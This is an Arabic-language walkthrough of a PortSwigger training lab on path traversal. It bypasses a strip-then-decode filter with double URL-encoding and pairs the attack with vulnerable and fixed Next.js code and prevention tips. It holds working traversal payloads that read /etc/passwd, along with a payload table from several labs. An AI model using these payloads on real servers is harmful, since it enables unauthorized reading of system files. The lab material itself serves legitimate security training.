# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

> **Category:** Path Traversal  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات، ولكن هذه المرة الخادم **يمنع `../` ثم يقوم بفك ترميز URL (URL-decode)** قبل استخدام المدخل، لذلك سنستخدم **ترميز مزدوج (Double URL-encode)** لتجاوز الفلتر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy.
- اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب، زر الماوس الأيمن → **Send to Repeater**.

### الخطوة 4: تجربة الطريقة القديمة (ستفشل)

جرب `../../../etc/passwd` أولاً:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
ستجد أنها **لا تعمل** لأن الخادم يمنع `../`.

### الخطوة 5: فهم آلية الفلتر

الخادم يعمل كالتالي:
1. يمنع أي مدخل يحتوي على `../`
2. ثم يقوم بـ **URL-decode** للمدخل
3. ثم يستخدم المدخل في بناء المسار

### الخطوة 6: استخدام الترميز المزدوج (Double URL-encode)

الترميز المزدوج لـ `/` هو `%252f` (لأن `%2f` هو ترميز `/`، وترميز `%` هو `%25`)

قم بتغيير `filename` إلى:
```
..%252f..%252f..%252fetc/passwd
```

يصبح الطلب:
```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
```

### الخطوة 7: ماذا يحدث خلف الكواليس؟

| الخطوة | القيمة |
|--------|--------|
| ما نرسله | `..%252f..%252f..%252fetc/passwd` |
| بعد منع `../` | لا يوجد `../` ظاهر، فالطلب مقبول |
| بعد URL-decode أول | `..%2f..%2f..%2fetc/passwd` |
| بعد URL-decode ثاني | `../../../etc/passwd` ← يتم القراءة |

### الخطوة 8: إرسال الطلب

- اضغط **Send** في Repeater.

### الخطوة 9: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 10: حل المختبر

بمجرد ظهور المحتوى، تم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **لماذا نستخدم `%252f`؟** | `%25` هو ترميز `%`، و`%2f` هو ترميز `/`، فالترميز المزدوج لـ `/` هو `%252f` |
| **كيف يعمل التجاوز؟** | الفلتر يمنع `../` لكنه لا يراه بسبب الترميز، وبعد فك الترميز يصبح `../` |
| **ما هو URL-decode؟** | تحويل `%2f` إلى `/` و `%25` إلى `%` |
| **لماذا مرتين؟** | لأن الخادم يفك الترميز مرة واحدة فقط بعد الفلتر |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يقوم بـ URL-decode **بعد** تطبيق الفلتر، مما يسمح باستخدام الترميز المزدوج لتجاوز الفلتر.

الترتيب الخاطئ:
1. فلتر يمنع `../`
2. URL-decode ← المشكلة هنا

---

### ❌ Non-Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// خطأ: الفلتر قبل فك الترميز
if (filename.includes('../')) {
  return res.status(403).send('Forbidden');
}

// فك الترميز بعد الفلتر (خطير!)
const decodedFilename = decodeURIComponent(filename);
const filePath = path.join('public/images', decodedFilename);
fs.readFileSync(filePath);
```

---

### ✅ Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// التصحيح: فك الترميز أولاً
const decodedFilename = decodeURIComponent(filename);

// ثم الفلتر على القيمة الحقيقية
if (decodedFilename.includes('../')) {
  return res.status(403).send('Forbidden');
}

// أو الأفضل: استخدام path.basename()
const safeFilename = path.basename(decodedFilename);
const filePath = path.join('public/images', safeFilename);
fs.readFileSync(filePath);
```

**الخلاصة:** الترتيب الصحيح: **فك الترميز أولاً → ثم التصفية**

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **الترتيب الصحيح:** قم بـ URL-decode أولاً، ثم طبق الفلتر.
2. **استخدام `path.basename()`:** يزيل أي مسارات بعد فك الترميز.
3. **قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة مسبقاً.
4. **تجنب URL-decode المتعدد:** استخدم decodeURIComponent مرة واحدة فقط.

---

## 📊 ملخص لابات Path Traversal

| اللاب | الفلتر | البايلود |
|-------|--------|----------|
| الأول | ولا فلتر | `../../../etc/passwd` |
| الثاني | يمنع `../` | `/etc/passwd` |
| الثالث | يحذف `../` مرة واحدة | `....//....//....//etc/passwd` |
| الرابع | يمنع `../` ثم URL-decode | `..%252f..%252f..%252fetc/passwd` |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
- [Double URL Encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
